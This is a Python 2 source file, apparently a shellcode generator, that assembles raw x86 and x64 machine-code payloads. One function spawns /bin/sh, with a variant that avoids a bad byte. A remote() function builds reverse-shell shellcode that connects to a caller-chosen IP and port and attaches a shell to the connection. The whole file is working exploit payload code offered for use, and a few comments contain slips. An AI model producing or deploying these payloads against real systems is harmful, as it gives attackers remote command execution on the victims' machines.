# -*- coding:utf-8 -*-

import struct

def GetPushStrAsm(inStr) :
    inStr = ('/' * (4 - (len(inStr) % 4))) + inStr # add padding
    pushStrAsm = ""
    for i in xrange(len(inStr) / 4) :
        pushStrAsm = "\x68" + inStr[i * 4 : (i + 1) * 4] + pushStrAsm
    return pushStrAsm


def execve(arch, cmd = '', option = '') :

    if cmd == '' :
        cmd = '//bin/sh'

    if arch == 'x86' :
        result=("\x31\xc0"              + #xor    %eax,%eax
                "\x50"                  + #push   %eax
                GetPushStrAsm(cmd)      + #push   cmd string on stack
                "\x89\xe3"              + #mov    %esp,%ebx
                "\x50"                  + #push   %eax
                "\x53"                  + #push   %ebx
                "\x89\xe1"              + #mov    %esp,%ecx
                "\x89\xc2"              + #mov    %eax,%edx
                "\xb0\x0b"              + #mov    $0xb,%al
                "\xcd\x80")               #int    $0x80

        if (option == 'scanf') :
            # mov 0xb, eax -> mov 0xbb, eax; sub 0xb0, eax
            result = result.replace('\xb0\x0b', '\xB0\xBB\x2C\xB0')
            
    elif arch == 'x64' :
        cmd = '//bin/sh'
        result=("\x48\x31\xd2"          + #xor    %rdx, %rdx
                "\x48\xbb" + cmd        + #mov    cmd, %rbx
                "\x48\xc1\xeb\x08"      + #shr    $0x8, %rbx
                "\x53"                  + #push   %rbx
                "\x48\x89\xe7"          + #mov    %rsp, %rdi
                "\x50"                  + #push   %rax
                "\x57"                  + #push   %rdi
                "\x48\x89\xe6"          + #mov    %rsp, %rsi
                "\xb0\x3b"              + #mov    $0x3b, %al
                "\x0f\x05")               #syscall  // sys_execve
        
    return result
    # execve(cmd, [cmd, 0], 0)


def remote(arch, ipStr, portNum) :
    IP = "".join(chr(int(num)) for num in ipStr.split('.'))
    PORT = struct.pack(">H", int(portNum))

    if arch == 'x86':
        result = ("\x31\xc0"            + #xor    eax, eax
                  "\x31\xdb"            + #xor    ebx, ebx
                  "\x31\xc9"            + #xor    ecx, ecx
                  "\xb0\x66"            + #mov    al, 0x66
                  "\xb3\x01"            + #mov    bl, 0x1
                  "\x51"                + #push   ecx
                  "\x6a\x06"            + #push   0x6
                  "\x6a\x01"            + #push   0x1
                  "\x6a\x02"            + #push   0x2
                  "\x89\xe1"            + #mov    ecx, esp
                  "\xcd\x80"            + #int    0x80
                  "\x89\xc6"            + #mov    esi, eax
                  "\xb0\x66"            + #mov    al, 0x66
                  "\x31\xdb"            + #xor    ebx, ebx
                  "\xb3\x02"            + #mov    bl, 0x2
                  "\x68"     + IP       + #push   IP
                  "\x66\x68" + PORT     + #pushw  PORT
                  "\x66\x53"            + #push   bx
                  "\xfe\xc3"            + #inc    bl
                  "\x89\xe1"            + #mov    ecx, esp
                  "\x6a\x10"            + #push   0x10
                  "\x51"                + #push   ecx
                  "\x56"                + #push   esi
                  "\x89\xe1"            + #mov    ecx, esp
                  "\xcd\x80"            + #int    0x80
                  "\x89\xd9"            + #mov    ecx, ebx
                  "\x89\xf3"            + #mov    ebx, esi
                  "\xfe\xc9"            + #dec    cl       <─┐
                  "\xb0\x3f"            + #mov    al, 0x3f   │
                  "\xcd\x80"            + #int    0x80       │ // sys_dup2
                  "\x75\xf8"            + #jne    -8        ─┘
                  "\x31\xc0"            + #xor    eax, eax
                  "\x31\xd2"            + #xor    edx, dex
                  "\x52"                + #push   edx
                  GetPushStrAsm('/bin/sh') + #push  /bin/sh
                  "\x89\xe3"            + #mov    ebx, esp
                  "\x52"                + #push   edx
                  "\x53"                + #push   ebx
                  "\x89\xe1"            + #mov    ecx, esp
                  "\xb0\x0b"            + #mov    al, 0xb
                  "\xcd\x80")             #int    0x80
        
    elif arch == 'x64':
        result=("\x48\x31\xc0"          + #xor    rax, rax
                "\x48\x31\xff"          + #xor    rdi, rdi
                "\x48\x31\xf6"          + #xor    rsi, rsi
                "\x48\x31\xd2"          + #xor    rdx, rdx
                "\x4d\x31\xc0"          + #xor    r8, r8
                "\x6a\x02"              + #push   0x2
                "\x5f"                  + #pop    rdi
                "\x6a\x01"              + #push   0x1
                "\x5e"                  + #pop    rsi
                "\x6a\x06"              + #push   0x6
                "\x5a"                  + #pop    rdx
                "\x6a\x29"              + #push   0x29
                "\x58"                  + #pop    rax
                "\x0f\x05"              + #syscall  // sys_socket
                "\x49\x89\xc0"          + #mov    r8, rax
                "\x48\x31\xf6"          + #xor    rsi, rsi
                "\x4d\x31\xd2"          + #xor    r10, r10
                "\x41\x52"              + #push   r10
                "\xc6\x04\x24\x02"      + #mov    BYTE PTR [rsp],0x2
                "\x66\xc7\x44\x24\x02" + PORT + #mov    WORD  PTR [rsp+0x2], PORT
                "\xc7\x44\x24\x04"     + IP   + #mov    DWORD PTR [rsp+0x4], IP
                "\x48\x89\xe6"          + #mov    rsi, rsp
                "\x6a\x10"              + #push   0x10
                "\x5a"                  + #pop    rdx
                "\x41\x50"              + #push   r8
                "\x5f"                  + #pop    rdi
                "\x6a\x2a"              + #push   0x2a
                "\x58"                  + #pop    rax
                "\x0f\x05"              + #syscall  // sys_connect
                "\x6a\x03"              + #push   0x03
                "\x5e"                  + #pop    rsi
                "\x48\xff\xce"          + #dec    rsi   <─┐
                "\x6a\x21"              + #push   0x21    │
                "\x58"                  + #pop    rax     │
                "\x0f\x05"              + #syscall        │ // sys_dup2
                "\x75\xf6"              + #jne    -0xa   ─┘
                "\x48\x31\xff"          + #xor    rdi, rdi
                "\x57"                  + #push   rdi
                "\x57"                  + #push   rdi
                "\x5e"                  + #pop    rsi
                "\x5a"                  + #pop    rdx
                "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + #movabs rdi, '//bin/sh'
                "\x48\xc1\xef\x08"      + #shr    rdi, 0x8
                "\x57"                  + #push   rdi
                "\x54"                  + #push   rsp
                "\x5f"                  + #pop    rdi
                "\x6a\x3b"              + #push   0x3b
                "\x58"                  + #pop    rax
                "\x0f\x05")               #syscall  // sys_execve

    return result
